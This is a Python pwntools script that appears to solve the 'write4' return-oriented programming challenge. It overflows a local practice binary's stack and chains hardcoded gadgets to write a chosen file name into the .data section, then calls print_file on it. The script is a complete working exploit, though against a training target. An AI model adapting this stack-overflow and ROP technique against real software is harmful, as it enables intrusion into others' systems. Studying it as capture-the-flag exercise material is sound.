#!/usr/bin/env python3

"""Exploiting write4

Creates ROP chain to write flag.txt to .data for later printing

Note: With a string of exactly 8 bytes it was perfectly aligned,
however, anything above that would overwrite the eip and cause a
segfault. There needed to be a function that could write a string
to memory per 8 bytes through the following steps:
- pop .data address with offset & string part into r14 & r15
- write the string part to the corresponding data address with mov
- do it again until no string left

Usage: $ python3 write4.py
"""

import sys

from pwn import *

context.log_level = "DEBUG"
context.binary = "./write4"

def align_string(string: str, gadget_pop: hex, gadget_data_addr: hex, gadget_move: hex) -> str:
    rop = b''
    length = len(string)
    align = length % 8
    if align != 0:
        print("[!] Must align_string...")
        string += b"\x00"*(8-align)
    print(f"[!] Aligned string: {string}")
    for i in range(0, length, 8):
        rop += p64(g_r14_r15)
        rop += p64(g_data+i)
        rop += string[i:i+8]
        rop += p64(g_mov)
    return rop

if len(sys.argv) < 2:
    print(f"Usage: python3 {sys.argv[0]} FILE")
    exit(0)

string = sys.argv[1].encode()

# p = gdb.debug(context.binary.path, gdbscript="init-gef")
p = process(context.binary.path)

g_mov = 0x400628 # mov qword ptr [r14], r15; ret;
g_r14_r15 = 0x400690 # pop r14; pop r15; ret;
g_rdi = 0x400693 # pop rdi; ret;
g_ret = 0x4004e6 # ret;

g_printfile = 0x400510 # print_file
g_data = 0x601028 # .data section

payload = b"a" * (40)

payload += align_string(string, g_r14_r15, g_data, g_mov)

payload += p64(g_rdi)
payload += p64(g_data)
payload += p64(g_ret)
payload += p64(g_printfile)

p.sendline(payload)
p.interactive()
